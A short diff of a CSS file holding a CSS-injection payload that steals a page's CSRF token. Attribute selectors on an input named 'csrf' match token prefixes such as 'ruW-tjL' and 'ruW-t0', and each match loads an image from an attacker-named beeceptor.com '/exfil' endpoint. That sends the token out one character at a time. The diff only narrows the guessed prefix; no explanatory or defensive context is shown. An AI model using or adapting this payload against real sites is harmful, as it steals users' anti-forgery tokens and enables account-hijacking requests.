@@ -1,6 +1,6 @@
 /* Alphanumeric characters with 'ruW-t' before each value */
 
-input[name^="csrf"][value^="ruW-tjL1BWCdhb"] { background-image: url("https://iamevil.free.beeceptor.com/exfil?char=ruW-tjL1BWCdhb"); }
+input[name^="csrf"][value^="ruW-tjL"] { background-image: url("https://iamevil.free.beeceptor.com/exfil?char=ruW-tjL"); }
 
 /* Digits */
 input[name^="csrf"][value^="ruW-t0"] { background-image: url("https://iamevil.free.beeceptor.com/exfil?char=ruW-t0"); }
